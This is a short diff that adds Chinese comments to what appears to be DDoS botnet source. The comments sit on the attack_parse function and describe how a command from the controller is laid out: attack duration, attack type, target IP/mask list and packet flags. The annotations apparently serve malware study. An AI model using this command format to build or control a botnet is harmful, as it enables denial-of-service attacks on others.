@@ -83,6 +83,8 @@ void attack_kill_all(void)
 }
 //按照事先约定的格式解析下发的攻击命令，即取出攻击参数
 //https://www.freebuf.com/articles/terminal/117927.html
+//4字节攻击时长，1字节攻击类型、攻击目标（目标数+ip地址+mask+ip地址+mask……+flags）
+//flags是可以配置数据包的特定字段（可选配置项如attack.h）中所示
 void attack_parse(char *buf, int len)
 {
     int i;
